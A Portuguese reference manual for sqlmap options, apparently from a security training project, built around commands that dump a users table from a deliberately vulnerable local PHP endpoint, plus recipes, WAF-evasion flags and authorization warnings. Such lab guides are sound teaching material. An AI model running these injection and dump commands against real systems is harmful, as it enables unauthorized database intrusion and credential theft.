# Manual de Parâmetros do sqlmap

Guia de referência dos parâmetros do [sqlmap](https://sqlmap.org) (testado
com a versão `1.10.8#stable`, instalada via `brew install sqlmap`), usando
como fio condutor o comando real já validado neste projeto contra
`A05-injecao/01-sql-injection/`:

```bash
sqlmap -u "http://127.0.0.1:8899/endpoint-vulneravel.php?usuario=admin&senha=x" \
  -p usuario --batch --level=3 --risk=2 --technique=BE --dbms=SQLite \
  --flush-session --dump -T usuarios
```

## Índice

1. [Anatomia de um comando sqlmap](#anatomia)
2. [O comando deste projeto, parâmetro por parâmetro](#comando-do-projeto)
3. [`--level` em detalhe](#level)
4. [`--risk` em detalhe](#risk)
5. [`--technique` em detalhe](#technique)
6. [Outros parâmetros essenciais por categoria](#outros-parametros)
7. [Receitas práticas (comandos prontos)](#receitas)
8. [Tabela de referência rápida](#referencia-rapida)
9. [Boas práticas e avisos](#boas-praticas)

---

## 1. Anatomia de um comando sqlmap {#anatomia}

Todo comando sqlmap segue mais ou menos esta forma:

```bash
sqlmap [ALVO] [OPÇÕES DE REQUISIÇÃO] [OPÇÕES DE DETECÇÃO] [OPÇÕES DE ENUMERAÇÃO] [OPÇÕES GERAIS]
```

- **Alvo** (`-u`, `-r`, `-d`, `-g`, `-l`, `-m`): diz ao sqlmap ONDE atacar.
- **Requisição** (`--data`, `--cookie`, `-H`, `--random-agent`): diz COMO
  montar a requisição HTTP (método, corpo, cookies, headers).
- **Detecção** (`--level`, `--risk`, `--technique`, `--dbms`): diz QUANTO
  esforço colocar procurando a injeção e QUE tipos testar.
- **Enumeração** (`--dbs`, `--tables`, `--dump`, `-T`, `-D`): só entram em
  ação DEPOIS que uma injeção foi confirmada — dizem O QUE extrair.
- **Gerais** (`--batch`, `--flush-session`, `-v`): controlam o
  comportamento do próprio sqlmap (interatividade, cache, verbosidade).

Você pode rodar um comando "de descoberta" primeiro (só detecção) e, se
achar algo, rodar de novo acrescentando as opções de enumeração — ou já
mandar tudo junto, como fizemos nos exemplos deste projeto.

---

## 2. O comando deste projeto, parâmetro por parâmetro {#comando-do-projeto}

```bash
sqlmap -u "http://127.0.0.1:8899/endpoint-vulneravel.php?usuario=admin&senha=x" \
  -p usuario --batch --level=3 --risk=2 --technique=BE --dbms=SQLite \
  --flush-session --dump -T usuarios
```

| Parâmetro | O que faz | Por que usamos assim aqui |
|---|---|---|
| `-u "..."` | Define a URL alvo. Os parâmetros de query string (`?usuario=admin&senha=x`) já entram automaticamente como candidatos a teste. | Aponta pro `endpoint-vulneravel.php`, o wrapper HTTP que expõe a função `login()` vulnerável via GET. |
| `-p usuario` | Restringe o teste a UM parâmetro específico, em vez de testar todos os parâmetros da URL. | `senha` passa por `md5()` antes de entrar na query, então não é injetável — testar ele só perderia tempo. Focar em `usuario` deixa o scan bem mais rápido. |
| `--batch` | Nunca pergunta nada interativamente — sempre assume a resposta padrão sugerida pelo próprio sqlmap. | Essencial pra rodar em script/CI sem alguém sentado respondendo prompts. |
| `--level=3` | Nível de profundidade dos testes (1 a 5). Ver seção 3. | Nível 3 já testa os parâmetros da URL com payloads mais variados que o nível 1 (padrão), sem ficar tão lento quanto nível 5. |
| `--risk=2` | Nível de "agressividade" dos payloads (1 a 3). Ver seção 4. | Nível 2 já inclui payloads baseados em `OR`/tempo, que são necessários pra achar esse tipo de injeção, sem chegar no risco 3 (que pode ser mais invasivo). |
| `--technique=BE` | Restringe quais TÉCNICAS de injeção o sqlmap tenta. Ver seção 5. | `B` (boolean-blind) e `E` (error-based) são as duas técnicas que funcionam nesse exemplo — restringir evita perder tempo testando UNION/time-based/stacked que não se aplicam aqui. |
| `--dbms=SQLite` | Informa o banco de dados de antemão, em vez de deixar o sqlmap descobrir sozinho (fingerprint). | Já sabemos que é SQLite (é o banco usado no projeto) — isso pula uma fase inteira de detecção e acelera MUITO o scan. |
| `--flush-session` | Descarta qualquer sessão/cache salvo de execuções anteriores contra essa mesma URL. | Garante um teste limpo a cada execução do `testar-com-sqlmap.sh`, sem resultado herdado de uma rodada anterior. |
| `--dump` | Depois de confirmar a injeção, extrai (despeja) o conteúdo de uma tabela. | É o passo que prova IMPACTO real — não só "existe injeção", mas "aqui estão os dados vazados". |
| `-T usuarios` | Especifica QUAL tabela extrair com `--dump` (sem isso, teria que enumerar `--tables` antes e escolher). | Já sabemos o nome da tabela (`usuarios`) porque é nosso próprio projeto de teste. |

---

## 3. `--level` em detalhe (1 a 5, padrão 1) {#level}

Controla ONDE o sqlmap procura por injeção e QUANTOS payloads testa em
cada lugar. Cada nível acima do anterior adiciona mais testes (é
cumulativo):

| Nível | O que testa |
|---|---|
| **1** (padrão) | Só os parâmetros da URL (GET) e do corpo (POST), com um conjunto básico de payloads. |
| **2** | Acrescenta testes nos valores de **cookies**. |
| **3** | Acrescenta testes em headers **User-Agent** e **Referer**. |
| **4** | Acrescenta testes no header **Host**. |
| **5** | Conjunto completo e mais lento de payloads em todos os pontos acima — usado quando os níveis anteriores não acharam nada e você suspeita fortemente que existe injeção. |

**Regra prática**: comece em `--level=1` (rápido). Se não achar nada e
ainda desconfiar, suba pra 3 ou 5. Nível mais alto = mais requisições HTTP
= mais lento e mais "barulhento" nos logs do alvo.

---

## 4. `--risk` em detalhe (1 a 3, padrão 1) {#risk}

Controla QUÃO "arriscados" (potencialmente destrutivos ou perceptíveis)
são os payloads testados:

| Risco | O que inclui |
|---|---|
| **1** (padrão) | Payloads seguros, que não deveriam ter efeito colateral algum na maioria dos casos. |
| **2** | Acrescenta payloads baseados em `OR` no `WHERE` (podem retornar/alterar mais linhas que o esperado se a query for de `UPDATE`/`DELETE`) e testes baseados em tempo (`SLEEP`/`BENCHMARK`). |
| **3** | Acrescenta payloads de teste específicos para stacked queries e alguns testes conhecidos por serem mais "pesados" para o banco (podem deixar a aplicação lenta durante o teste). |

**Regra prática**: `--risk=1` é seguro pra quase qualquer ambiente.
`--risk=2` já é o suficiente pra achar a maioria das injeções reais (é o
que usamos aqui). Só suba pra `--risk=3` em ambiente de teste/laboratório
que você controla totalmente — nunca em produção de terceiros.

---

## 5. `--technique` em detalhe (padrão `"BEUSTQ"`) {#technique}

Cada letra liga uma técnica de detecção/exploração diferente. Por padrão
o sqlmap tenta TODAS; você pode restringir com `--technique=XY` pra focar
só nas que fazem sentido pro seu alvo (mais rápido):

| Letra | Técnica | Quando funciona |
|---|---|---|
| **B** | Boolean-based blind | A resposta muda (tamanho/conteúdo) dependendo se a condição injetada é verdadeira ou falsa, mesmo sem mensagem de erro visível. |
| **E** | Error-based | O banco devolve uma mensagem de erro que vaza informação (ex: resultado de uma subquery dentro da mensagem de erro). |
| **U** | UNION query-based | Dá pra usar `UNION SELECT` pra anexar dados arbitrários ao resultado normal da query. |
| **S** | Stacked queries | O driver/banco permite empilhar múltiplas queries separadas por `;` numa única chamada (ex: `; DROP TABLE ...`). SQLite/MySQL via PHP normalmente NÃO permitem isso por padrão. |
| **T** | Time-based blind | Não há diferença visível na resposta, mas dá pra inferir informação medindo QUANTO TEMPO a resposta demora (ex: `SLEEP(5)`). |
| **Q** | Inline queries | Técnica mais rara, injeta uma subquery inline dentro da própria query original. |

No nosso exemplo usamos `--technique=BE` porque já sabíamos (pela
estrutura da query vulnerável) que boolean-blind e error-based são as duas
que se aplicam — testar U/S/T/Q ali seria tempo perdido.

---

## 6. Outros parâmetros essenciais, por categoria {#outros-parametros}

### Alvo e requisição

| Parâmetro | Uso |
|---|---|
| `--data="a=1&b=2"` | Testa via POST em vez de GET. |
| `--cookie="PHPSESSID=..."` | Testa uma sessão autenticada (cole o cookie pego do navegador depois de logar manualmente). |
| `-H "X-Custom: valor"` | Adiciona um header customizado a cada requisição. |
| `--random-agent` | Usa um User-Agent aleatório a cada requisição (ajuda contra WAFs simples que bloqueiam por assinatura). |
| `--forms` | Acha e testa automaticamente formulários HTML na página informada em `-u`. |
| `--crawl=3` | Rastreia links a partir da URL, até 3 níveis de profundidade, testando cada página encontrada. |
| `-r arquivo.txt` | Carrega a requisição HTTP inteira de um arquivo (útil pra requisições complexas capturadas do Burp/ZAP). |

### Enumeração (depois de confirmar a injeção)

| Parâmetro | Uso |
|---|---|
| `--dbs` | Lista os bancos de dados disponíveis. |
| `-D nome_banco --tables` | Lista as tabelas de um banco específico. |
| `-D nome_banco -T tabela --columns` | Lista as colunas de uma tabela. |
| `-D nome_banco -T tabela --dump` | Extrai (despeja) o conteúdo da tabela. |
| `--dump-all` | Extrai TUDO de todos os bancos/tabelas — use com cautela, pode demorar muito e ser bem invasivo. |
| `-C usuario,senha` | Restringe o dump a colunas específicas. |
| `--where="id > 10"` | Filtra quais linhas extrair no dump. |
| `--current-user` / `--current-db` / `--is-dba` | Informação rápida sobre o usuário/banco atual da conexão. |

### Performance

| Parâmetro | Uso |
|---|---|
| `--threads=4` | Roda até N requisições HTTP concorrentes (mais rápido, mas mais carga no alvo). |
| `--time-sec=5` | Ajusta o tempo de delay usado nos testes time-based (padrão 5s). |
| `-o` | Liga todas as otimizações de performance de uma vez. |

### Evasão / ambientes com proteção

| Parâmetro | Uso |
|---|---|
| `--tamper=space2comment` | Aplica um script de "disfarce" no payload pra tentar passar por filtros/WAF simples. `--list-tampers` mostra todos os disponíveis. |
| `--delay=1` | Espera N segundos entre requisições (mais discreto, mais lento). |
| `--safe-url="http://alvo/home"` | Visita essa URL periodicamente durante o teste, pra não disparar alarmes de "sessão inativa" ou rate-limit. |

### Sessão e saída

| Parâmetro | Uso |
|---|---|
| `--flush-session` | Descarta cache/sessão salvos dessa URL antes de rodar de novo. |
| `--purge` | Apaga TODOS os dados armazenados pelo sqlmap (`~/.local/share/sqlmap`) — útil pra "zerar" o histórico. |
| `-v 3` | Aumenta a verbosidade (0 a 6) — útil pra debugar por que uma injeção não está sendo detectada. |
| `--answers="follow=Y"` | Pré-define respostas pra perguntas específicas, sem precisar do `--batch` genérico. |

---

## 7. Receitas práticas {#receitas}

### Descoberta rápida (nível básico, o suficiente na maioria dos casos)

```bash
sqlmap -u "http://127.0.0.1:8899/endpoint-vulneravel.php?usuario=admin&senha=x" --batch
```

### Descoberta mais profunda, focada num parâmetro

```bash
sqlmap -u "http://127.0.0.1:8899/endpoint-vulneravel.php?usuario=admin&senha=x" \
  -p usuario --batch --level=5 --risk=3
```

### Já sabendo o banco, restringindo técnica (o comando deste projeto)

```bash
sqlmap -u "http://127.0.0.1:8899/endpoint-vulneravel.php?usuario=admin&senha=x" \
  -p usuario --batch --level=3 --risk=2 --technique=BE --dbms=SQLite --flush-session
```

### Enumerando o banco inteiro passo a passo

Testado de verdade contra `01-sql-injection/endpoint-vulneravel.php`. Note
que em **SQLite** o `--dbs` não se aplica (SQLite não tem múltiplos bancos
nomeados como MySQL/PostgreSQL) — o próprio sqlmap avisa: `on SQLite it is
not possible to enumerate databases (use only '--tables')`. Então o fluxo
para SQLite pula direto para `--tables`:

```bash
BASE='-u "http://127.0.0.1:8899/endpoint-vulneravel.php?usuario=admin&senha=x" -p usuario --batch --level=3 --risk=2 --technique=BE --dbms=SQLite --flush-session'

# 1) listar tabelas (sem -D, SQLite so tem um "banco" implicito)
sqlmap $BASE --tables
# -> encontra a tabela 'usuarios'

# 2) listar colunas da tabela encontrada
sqlmap $BASE -T usuarios --columns
# -> id (INTEGER), usuario (TEXT), senha_hash (TEXT)

# 3) extrair o conteudo
sqlmap $BASE -T usuarios --dump
# -> id=1 | usuario=admin | senha_hash=8ba4b2bed568d78d3f03a56c5788c272
```

Repare que só a opção de enumeração muda a cada passo (`--tables` →
`--columns` → `--dump`) — o resto do comando (alvo, parâmetro, técnica,
DBMS) fica sempre igual. Em bancos que suportam múltiplos schemas
(MySQL/PostgreSQL/MSSQL), o fluxo tem um passo a mais antes: `--dbs` para
listar os bancos, depois `-D nome_do_banco --tables` para as tabelas
daquele banco específico.

### Extraindo direto, já sabendo a tabela (o que fizemos no projeto)

```bash
sqlmap -u "http://127.0.0.1:8899/endpoint-vulneravel.php?usuario=admin&senha=x" \
  -p usuario --batch --level=3 --risk=2 --technique=BE --dbms=SQLite \
  --flush-session --dump -T usuarios
```

### Testando um formulário de login autenticado

```bash
sqlmap -u "http://alvo/login.php" --data="usuario=admin&senha=x" \
  --cookie="PHPSESSID=abc123" --batch --forms
```

---

## 8. Tabela de referência rápida {#referencia-rapida}

| Quero... | Uso |
|---|---|
| Testar sem nenhuma pergunta interativa | `--batch` |
| Focar num parâmetro só | `-p nome_do_parametro` |
| Ir mais fundo na busca | `--level=3` a `5` |
| Payloads mais agressivos | `--risk=2` a `3` |
| Só técnicas específicas | `--technique=BE` (ou outras letras) |
| Pular a detecção de banco | `--dbms=SQLite` (ou MySQL, PostgreSQL...) |
| Ignorar cache de execuções anteriores | `--flush-session` |
| Listar bancos/tabelas/colunas | `--dbs` / `--tables` / `--columns` |
| Extrair uma tabela | `--dump -T nome_da_tabela` |
| Testar via POST | `--data="a=1&b=2"` |
| Testar autenticado | `--cookie="PHPSESSID=..."` |
| Testar formulário HTML da página | `--forms` |
| Rastrear o site inteiro | `--crawl=3` |

---

## 9. Boas práticas e avisos {#boas-praticas}

- **Só use contra alvos que você tem autorização explícita para testar** —
  ambiente próprio, laboratório, ou pentest com escopo definido por
  escrito. Uso não autorizado é crime.
- Comece sempre com `--risk=1 --level=1` (ou nem especifique, já é o
  padrão) antes de escalar — evita payloads desnecessariamente agressivos.
- Em produção de terceiros (mesmo autorizado), combine antes com o time
  responsável — um scan em `--risk=3` pode gerar carga significativa.
- `--dump-all` e `--os-shell`/`--os-pwn` (execução de comando no SO via
  banco) só fazem sentido num pentest formal com escopo que cubra
  exploração ativa — nunca use por padrão.
- Depois de terminar, `sqlmap --purge` limpa os dados locais armazenados
  (sessões, dumps) se você não precisar mais deles.

Veja também:
- `A05-injecao/01-sql-injection/SQLMAP.md` e
  `A05-injecao/07-orm-injection/SQLMAP.md` — comandos exatos já testados
  contra os exemplos deste projeto.
- `A05-injecao/sqlmap-checklist-geral.md` — checklist de processo (por
  onde começar, quando escalar) pra auditar qualquer app PHP.
